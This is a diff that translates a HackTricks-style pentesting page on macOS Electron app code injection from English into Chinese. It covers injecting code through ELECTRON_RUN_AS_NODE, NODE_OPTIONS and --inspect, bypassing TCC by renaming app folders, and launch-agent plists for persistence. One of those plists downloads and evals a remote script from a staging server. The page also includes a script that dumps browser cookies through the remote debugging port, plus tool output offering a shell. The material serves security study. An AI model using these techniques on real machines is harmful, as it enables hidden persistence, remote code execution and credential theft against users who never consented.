@@ -1,133 +1,120 @@
-# macOS Electron Applications Injection
+# macOS Electron 应用程序注入
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Basic Information
+## 基本信息
 
-If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). But for now just know that Electron runs **node**.\
-And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.
+如果你不知道 Electron 是什么，你可以在 [**这里找到很多信息**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。但现在只需知道 Electron 运行 **node**。\
+而 node 有一些 **参数** 和 **环境变量** 可以用来 **执行其他代码**，而不是指定的文件。
 
-### Electron Fuses
+### Electron 保护机制
 
-These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
+这些技术将在接下来的部分讨论，但最近 Electron 添加了几个 **安全标志以防止它们**。这些是 [**Electron 保护机制**](https://www.electronjs.org/docs/latest/tutorial/fuses)，用于 **防止** macOS 上的 Electron 应用程序 **加载任意代码**：
 
-- **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
-- **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
-- **`EnableEmbeddedAsarIntegrityValidation`**: If enabled, the loaded **`asar`** **file** will be **validated** by macOS. **Preventing** this way **code injection** by modifying the contents of this file.
-- **`OnlyLoadAppFromAsar`**: If this is enabled, instead of searching to load in the following order: **`app.asar`**, **`app`** and finally **`default_app.asar`**. It will only check and use app.asar, thus ensuring that when **combined** with the **`embeddedAsarIntegrityValidation`** fuse it is **impossible** to **load non-validated code**.
-- **`LoadBrowserProcessSpecificV8Snapshot`**: If enabled, the browser process uses the file called `browser_v8_context_snapshot.bin` for its V8 snapshot.
+- **`RunAsNode`**：如果禁用，它会阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 来注入代码。
+- **`EnableNodeCliInspectArguments`**：如果禁用，像 `--inspect`、`--inspect-brk` 这样的参数将不被尊重。避免通过这种方式注入代码。
+- **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，加载的 **`asar`** **文件** 将由 macOS **验证**。以此方式 **防止** 通过修改该文件的内容进行 **代码注入**。
+- **`OnlyLoadAppFromAsar`**：如果启用，它将只检查并使用 app.asar，而不是按以下顺序加载：**`app.asar`**、**`app`**，最后是 **`default_app.asar`**，从而确保当与 **`embeddedAsarIntegrityValidation`** 保护机制 **结合** 使用时，**不可能** **加载未验证的代码**。
+- **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程将使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。
 
-Another interesting fuse that won't be preventing code injection is:
+另一个有趣的保护机制不会阻止代码注入的是：
 
-- **EnableCookieEncryption**: If enabled, the cookie store on disk is encrypted using OS level cryptography keys.
+- **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级别的加密密钥进行加密。
 
-### Checking Electron Fuses
+### 检查 Electron 保护机制
 
-You can **check these flags** from an application with:
-
+你可以通过以下方式 **检查这些标志**：
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
 Analyzing app: Slack.app
 Fuse Version: v1
-  RunAsNode is Disabled
-  EnableCookieEncryption is Enabled
-  EnableNodeOptionsEnvironmentVariable is Disabled
-  EnableNodeCliInspectArguments is Disabled
-  EnableEmbeddedAsarIntegrityValidation is Enabled
-  OnlyLoadAppFromAsar is Enabled
-  LoadBrowserProcessSpecificV8Snapshot is Disabled
+RunAsNode is Disabled
+EnableCookieEncryption is Enabled
+EnableNodeOptionsEnvironmentVariable is Disabled
+EnableNodeCliInspectArguments is Disabled
+EnableEmbeddedAsarIntegrityValidation is Enabled
+OnlyLoadAppFromAsar is Enabled
+LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
+### 修改 Electron Fuses
 
-### Modifying Electron Fuses
+如[**文档所述**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses**的配置是在**Electron 二进制文件**内部配置的，该文件中包含字符串**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。
 
-As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
-
-In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
-
+在 macOS 应用程序中，这通常位于`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-
-You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
+您可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件并搜索前面的字符串。在此字符串后，您可以在 ASCII 中看到数字 "0" 或 "1"，指示每个保险丝是禁用还是启用。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`）以 **修改保险丝值**。
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
+请注意，如果您尝试 **覆盖** 应用程序内部的 **`Electron Framework`** 二进制文件并修改这些字节，则应用程序将无法运行。
 
-## RCE adding code to Electron Applications
+## 向 Electron 应用程序添加 RCE 代码
 
-There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.
+可能有 **外部 JS/HTML 文件** 被 Electron 应用程序使用，因此攻击者可以在这些文件中注入代码，这些文件的签名不会被检查，并在应用程序的上下文中执行任意代码。
 
 > [!CAUTION]
-> However, at the moment there are 2 limitations:
+> 但是，目前有两个限制：
 >
-> - The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
-> - The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`
+> - 修改应用程序需要 **`kTCCServiceSystemPolicyAppBundles`** 权限，因此默认情况下这不再可能。
+> - 编译后的 **`asap`** 文件通常具有 **`embeddedAsarIntegrityValidation`** 和 **`onlyLoadAppFromAsar`** 权限 `启用`
 >
-> Making this attack path more complicated (or impossible).
+> 这使得攻击路径更加复杂（或不可能）。
 
-Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.
+请注意，可以通过将应用程序复制到另一个目录（如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，**修改** **asar** 文件以包含您的 **恶意** 代码，然后将其重命名回 **`app.app/Contents`** 并执行它，从而绕过 **`kTCCServiceSystemPolicyAppBundles`** 的要求。
 
-You can unpack the code from the asar file with:
-
+您可以使用以下命令从 asar 文件中解压代码：
 ```bash
 npx asar extract app.asar app-decomp
 ```
-
-And pack it back after having modified it with:
-
+并在修改后重新打包：
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-
 ## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), if this env variable is set, it will start the process as a normal Node.js process.
-
+根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)，如果设置了这个环境变量，它将以普通的 Node.js 进程启动该进程。
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 # Then from the nodeJS console execute:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-
 > [!CAUTION]
-> If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
+> 如果熔断器 **`RunAsNode`** 被禁用，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，这将无法工作。
 
-### Injection from the App Plist
+### 从应用程序 Plist 注入
 
-As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
-
+正如 [**这里提到的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，您可以在 plist 中滥用这个环境变量以保持持久性：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-    </dict>
-    <key>Label</key>
-    <string>com.xpnsec.hideme</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>-e</string>
-        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+</dict>
+<key>Label</key>
+<string>com.xpnsec.hideme</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>-e</string>
+<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
-
 ## RCE with `NODE_OPTIONS`
 
-You can store the payload in a different file and execute it:
-
+您可以将有效负载存储在不同的文件中并执行它：
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -135,52 +122,46 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
-
 > [!CAUTION]
-> If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore** the env var **NODE_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+> 如果熔断器 **`EnableNodeOptionsEnvironmentVariable`** 被 **禁用**，则应用在启动时将 **忽略** 环境变量 **NODE_OPTIONS**，除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
 >
-> If you don't set **`ELECTRON_RUN_AS_NODE`** , you will find the **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+> 如果您不设置 **`ELECTRON_RUN_AS_NODE`**，您将会发现 **错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
-### Injection from the App Plist
+### 从 App Plist 注入
 
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+您可以在 plist 中滥用此环境变量以保持持久性，添加以下键：
 ```xml
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-           <key>NODE_OPTIONS</key>
-           <string>--require /tmp/payload.js</string>
-    </dict>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+<key>NODE_OPTIONS</key>
+<string>--require /tmp/payload.js</string>
+</dict>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
-
 ## RCE with inspecting
 
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
-For example:
-
+根据[**这个**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用 **`--inspect`**、**`--inspect-brk`** 和 **`--remote-debugging-port`** 等标志执行 Electron 应用程序，**调试端口将会打开**，这样你就可以连接到它（例如从 Chrome 的 `chrome://inspect`）并且你将能够**在其上注入代码**，甚至启动新进程。\
+例如：
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-
 > [!CAUTION]
-> If the fuse **`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+> 如果熔断器 **`EnableNodeCliInspectArguments`** 被禁用，应用程序将 **忽略节点参数**（如 `--inspect`），除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
 >
-> However, you could still use the **electron param `--remote-debugging-port=9229`** but the previous payload won't work to execute other processes.
+> 然而，您仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的有效载荷将无法执行其他进程。
 
-Using the param **`--remote-debugging-port=9222`** it's possible to steal some information from the Electron App like the **history** (with GET commands) or the **cookies** of the browser (as they are **decrypted** inside the browser and there is a **json endpoint** that will give them).
+使用参数 **`--remote-debugging-port=9222`** 可以从 Electron 应用程序中窃取一些信息，如 **历史记录**（使用 GET 命令）或浏览器的 **cookies**（因为它们在浏览器内部 **解密**，并且有一个 **json 端点** 可以提供它们）。
 
-You can learn how to do that in [**here**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script like:
-
+您可以在 [**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) 和 [**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) 学习如何做到这一点，并使用自动工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或简单的脚本，如：
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -188,43 +169,39 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
+在[**这篇博客**](https://hackerone.com/reports/1274695)中，这种调试被滥用，使得无头 Chrome **在任意位置下载任意文件**。
 
-In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+### 从应用程序 Plist 注入
 
-### Injection from the App Plist
-
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+您可以在 plist 中滥用此环境变量，通过添加这些键来保持持久性：
 ```xml
 <dict>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>--inspect</string>
-    </array>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>--inspect</string>
+</array>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
-
-## TCC Bypass abusing Older Versions
+## TCC 绕过旧版本的滥用
 
 > [!TIP]
-> The TCC daemon from macOS doesn't check the executed version of the application. So if you **cannot inject code in an Electron application** with any of the previous techniques you could download a previous version of the APP and inject code on it as it will still get the TCC privileges (unless Trust Cache prevents it).
+> macOS 的 TCC 守护进程不会检查应用程序的执行版本。因此，如果你 **无法在 Electron 应用程序中注入代码**，你可以下载该应用的旧版本并在其上注入代码，因为它仍然会获得 TCC 权限（除非 Trust Cache 阻止它）。
 
-## Run non JS Code
+## 运行非 JS 代码
 
-The previous techniques will allow you to run **JS code inside the process of the electron application**. However, remember that the **child processes run under the same sandbox profile** as the parent application and **inherit their TCC permissions**.\
-Therefore, if you want to abuse entitlements to access the camera or microphone for example, you could just **run another binary from the process**.
+之前的技术将允许你在 **Electron 应用程序的进程中运行 JS 代码**。然而，请记住，**子进程在与父应用程序相同的沙箱配置文件下运行**，并且 **继承它们的 TCC 权限**。\
+因此，如果你想滥用权限访问相机或麦克风，例如，你可以直接 **从进程中运行另一个二进制文件**。
 
-## Automatic Injection
+## 自动注入
 
-The tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
+工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可以轻松用于 **查找已安装的易受攻击的 Electron 应用程序** 并在其上注入代码。该工具将尝试使用 **`--inspect`** 技术：
 
-You need to compile it yourself and can use it like this:
-
+你需要自己编译它，可以这样使用：
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -260,8 +237,7 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
-
-## References
+## 参考文献
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
 - [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
